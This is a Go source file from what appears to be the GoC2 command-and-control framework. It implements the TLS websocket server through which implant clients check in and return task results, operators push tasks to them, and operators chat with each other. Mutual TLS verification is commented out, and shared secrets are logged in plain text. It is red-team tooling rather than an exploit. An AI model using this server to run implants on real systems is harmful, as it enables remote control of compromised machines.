package routes

import (
	"crypto/tls"
	"encoding/json"
	"fmt"

	"net/http"
	"time"

	"github.com/gorilla/websocket"
	"github.com/latortuga71/GoC2/internal/data"
	"github.com/latortuga71/GoC2/internal/db"

	"github.com/latortuga71/GoC2/internal/log"
	"github.com/latortuga71/GoC2/internal/server"
	"github.com/latortuga71/GoC2/internal/utils"
)

var SocketUpgrader = websocket.Upgrader{}

func StartWebSocketServer() {
	// setup mTLS for websocket endpoints.
	//log.Log.Debug().Msg("Setting up mTLS...")
	caCrtPem := server.ServerCertificateAuthority.PemEncodeCert(server.ServerCertificateAuthority.CACertificate)
	server.ServerCertPool.AppendCertsFromPEM(caCrtPem.Bytes())
	tlsConfig := &tls.Config{
		ClientCAs: server.ServerCertPool,
		//ClientAuth:               tls.RequireAndVerifyClientCert, <- mtls flag
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
		PreferServerCipherSuites: true,
		/*
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_RSA_WITH_AES_256_CBC_SHA,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			},
		*/
	}
	tlsConfig.BuildNameToCertificate()
	mux := http.NewServeMux()
	mux.HandleFunc("/socketClient", SocketHandlerClient)
	mux.HandleFunc("/socketOperator", SocketHandlerOperator)
	mux.HandleFunc("/operatorChat", ChatHandler)
	go func() {
		for {
			time.Sleep(time.Second * 5)
			server.ServerCleanClientConnections()
		}
	}()
	server := http.Server{
		Addr:         ":443",
		Handler:      mux,
		TLSConfig:    tlsConfig,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  120 * time.Second,
	}
	err := server.ListenAndServeTLS("../certs/server.cert", "../certs/server.key")
	log.Log.Fatal().Msgf("%v", err)
}

func ChatHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := SocketUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Log.Error().Str("service", "WebsocketChatHandler").Msgf("Error during connection upgradation:", err)
		return
	}
	operatorHandle := r.Header.Get("nick")
	sharedSecret := r.Header.Get("shared-secret")
	if sharedSecret != server.ServerSharedSecret {
		log.Log.Error().Str("service", "WebsocketChatHandler").Msgf("Error closing connection invalid shared secret supplied -> %s", sharedSecret)
		conn.Close()
		return
	}
	if operatorHandle == "" {
		log.Log.Error().Str("service", "WebsocketChatHandler").Msgf("Error acquiring Nick from headers %v", err)
		conn.Close()
		return
	}
	if !db.OperatorsDatabase.AddChatConnection(operatorHandle, conn) {
		log.Log.Error().Str("service", "WebsocketChatHandler").Msgf("Nick %s already connected. Closing Connection", err)
		conn.Close()
		return
	}
	log.Log.Debug().Str("service", "WebsocketChatHandler").Msgf("Got Nick -> %s", operatorHandle)
	log.Log.Debug().Str("service", "WebsocketChatHandler").Msgf("Got Shared Secret -> %s", sharedSecret)
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Log.Error().Str("service", "WebsocketChatHandler").Msgf("Error during message type reading: %v", err)
			break
		}
		for key, op := range db.OperatorsDatabase.Database {
			if key == operatorHandle {
				continue
			}
			if op.ChatConn == nil {
				continue
			}
			formattedMessage := fmt.Sprintf("[ %s ] <_%s_>: %s", time.Now().Format(time.RFC1123), operatorHandle, message)
			err := op.ChatConn.WriteMessage([]byte(formattedMessage))
			if err != nil {
				db.OperatorsDatabase.DeleteConnection(op.OperatorNick)
			}
		}
	}
}

func SocketHandlerClient(w http.ResponseWriter, r *http.Request) {
	conn, err := SocketUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Log.Error().Str("service", "WebsocketClientHandler").Msgf("Error during connection upgradation:", err)
		return
	}
	clientUUID := data.GenerateUUID()
	defer conn.Close()
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Log.Error().Str("service", "WebsocketClientHandler").Msgf("Error during message type reading: %v", err)
			break
		}
		err, messageType := utils.CheckMessage(message)
		if err != nil {
			log.Log.Error().Str("service", "WebsocketClientHandler").Msgf("Err Uknown Message Type Received: %s", message)
			continue
		}
		switch messageType {
		case "TaskResult":
			log.Log.Info().Str("service", "WebsocketClientHandler").Msgf("Client %s Sent Task Result.", clientUUID)
			if !server.ServerHandleTaskResult(clientUUID, message) {
				log.Log.Error().Str("service", "WebsocketClientHandler").Msg("Failed to add task result to database.")
			}
		case "CheckIn":
			msg := server.ServerHandleCheckIn(clientUUID, message, conn)
			log.Log.Info().Str("service", "WebsocketClientHandler").Msgf("Client %s Checking In...", clientUUID)
			if msg != nil {
				err = conn.WriteMessage(websocket.TextMessage, msg.ToBytes())

			} else {
				msg := data.Message{
					MessageType: "Exit",
					MessageData: nil,
				}
				err = conn.WriteMessage(websocket.TextMessage, msg.ToBytes())
			}
			if err != nil {
				log.Log.Error().Str("service", "WebsocketClientHandler").Msgf("Error during message writing:", err, clientUUID)
			}
		default:
			log.Log.Info().Str("service", "WebsocketClientHandler").Msgf("Got Client %s Unknown Message Type", clientUUID)
		}
	}
}

func SocketHandlerOperator(w http.ResponseWriter, r *http.Request) {
	conn, err := SocketUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Log.Error().Msgf("Error during connection upgradation:", err)
		return
	}
	operatorHandle := r.Header.Get("nick")
	if operatorHandle == "" {
		log.Log.Error().Str("service", "WebsocketOperatorHandler").Msgf("Error acquiring Nick from headers %v", err)
		conn.Close()
		return
	}
	sharedSecret := r.Header.Get("shared-secret")
	if sharedSecret != server.ServerSharedSecret {
		log.Log.Error().Str("service", "WebsocketChatHandler").Msgf("Error closing connection invalid shared secret supplied -> %s", sharedSecret)
		conn.Close()
		return
	}
	log.Log.Debug().Str("service", "WebsocketOperatorHandler").Msgf("Got Nick -> %s", operatorHandle)
	log.Log.Debug().Str("service", "WebsocketOperatorHandler").Msgf("Got Shared Secret -> %s", sharedSecret)
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Log.Error().Str("service", "WebsocketOperatorHandler").Msgf("Error during message type reading: %v", err)
			break
		}
		err, messageType := utils.CheckMessage(message)
		if err != nil {
			log.Log.Error().Str("service", "WebsocketOperatorHandler").Msgf("Err Uknown Mesage Type Received: %s", message)
			continue
		}
		switch messageType {
		case "Task":
			log.Log.Info().Str("service", "WebsocketOperatorHandler").Msgf("Operator %s Sending Task.", operatorHandle)
			if !server.ServerHandleTask(message) {
				log.Log.Debug().Msg("Failed to relay task to client.")
				log.Log.Error().Str("service", "WebsocketOperatorHandler").Msg("Failed to relay task to client")
				m := &data.Message{}
				t := &data.Task{}
				// add error handling here.
				json.Unmarshal(message, m)
				json.Unmarshal(m.MessageData, t)
				r := &data.TaskResult{
					ClientId:   t.ClientId,
					OperatorId: t.OperatorId,
					Result:     "Failed to relay task to client.",
				}
				if !db.OperatorsDatabase.AddOperatorTaskFailed(t.OperatorId, *r) {
					log.Log.Error().Str("service", "WebsocketOperatorHandler").Msg("Failed to add task result to database.")
				}
			}
		case "OperatorCheckIn":
			log.Log.Info().Str("service", "WebsocketOperatorHandler").Msgf("Operator %s Checking In...", operatorHandle)
			msg := server.ServerHandleOperatorCheckIn(operatorHandle, message, conn)
			if msg != nil {
				err = conn.WriteMessage(websocket.TextMessage, msg.ToBytes())
			} else {
				msg := data.Message{
					MessageType: "Exit",
					MessageData: nil,
				}
				err = conn.WriteMessage(websocket.TextMessage, msg.ToBytes())
				return
			}
			if err != nil {
				log.Log.Error().Str("service", "WebsocketOperatorHandler").Msgf("Error during message writing: %v", err)
				break
			}
		default:
			log.Log.Info().Str("service", "WebsocketOperatorHandler").Msgf("Got operator %s sent unknown message type", operatorHandle)
		}
	}
}
